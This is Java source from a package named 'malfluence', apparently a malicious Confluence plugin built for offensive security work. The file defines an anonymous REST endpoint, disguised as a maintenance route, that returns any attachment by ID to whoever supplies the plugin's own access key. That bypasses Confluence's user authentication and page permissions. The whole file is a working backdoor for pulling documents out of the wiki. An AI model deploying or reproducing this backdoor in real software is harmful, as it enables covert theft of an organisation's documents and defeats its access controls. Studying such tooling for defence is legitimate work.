package com.cyllective.malfluence.rest;

import com.cyllective.malfluence.helpers.Helpers;
import com.cyllective.malfluence.helpers.Log;

import com.atlassian.confluence.pages.*;
import com.atlassian.sal.api.component.ComponentLocator;
import com.atlassian.spring.container.ContainerManager;
import com.atlassian.confluence.api.model.content.ContentType;
import com.atlassian.plugins.rest.common.security.AnonymousAllowed;

import javax.ws.rs.GET;
import javax.ws.rs.Path;
import javax.ws.rs.Produces;
import javax.ws.rs.QueryParam;
import javax.ws.rs.core.MediaType;
import javax.ws.rs.core.Response;
import java.io.InputStream;

// Returns an attachment identified by its ID
// GET /maintenance/getattachment?accesskey=<Access Key>&id=<Attachment ID>
@Path("/getattachment")
public class AttachmentDownload {

    @GET
    @AnonymousAllowed
    @Produces(MediaType.WILDCARD)
    public Response DownloadAttachment(@QueryParam("accesskey") String accesskey, @QueryParam("id") String attachmentId) {
        try {
            if (!Auth.IsValidKey(accesskey)) {
                return Response
                        .status(Response.Status.FORBIDDEN)
                        .build();
            }

            if (attachmentId == null) {
                String message = "Invalid parameter id";
                Log.Debug(message);
                return Response
                        .status(Response.Status.BAD_REQUEST)
                        .entity(message)
                        .build();
            }

            // Get the instance of the Attachment manager
            AttachmentManager attachmentManager = (AttachmentManager) ContainerManager.getComponent("attachmentManager");

            // Load the attachment;
            Attachment attachment = attachmentManager.getAttachment(new Long(attachmentId));
            if (attachment == null) {
                String message = "Invalid attachment id";
                Log.Debug(message);
                return Response
                        .status(Response.Status.BAD_REQUEST)
                        .entity(message)
                        .build();
            }

            // Read the content of the attachment
            InputStream contentStream = attachmentManager.getAttachmentData(attachment);
            byte[] content = Helpers.ReadAllBytes(contentStream);
            String contentType = attachment.getMediaType();
            String fileName = attachment.getDisplayTitle();
            Log.Debug(String.format("Got request for file '%s'", fileName));

            // Set the body of the response to the file and adjust the content type as well as set the "Content-Disposition" to signal a download
            Response.ResponseBuilder responseBuilder = Response.ok().entity(content);
            responseBuilder.type(contentType);
            responseBuilder.header("Content-Disposition", String.format("attachment; filename=\"%s\"", fileName));

            return responseBuilder.build();

        } catch (Exception e) {
            Log.Error(e);
            return Response
                    .status(Response.Status.INTERNAL_SERVER_ERROR)
                    .build();
        }
    }
}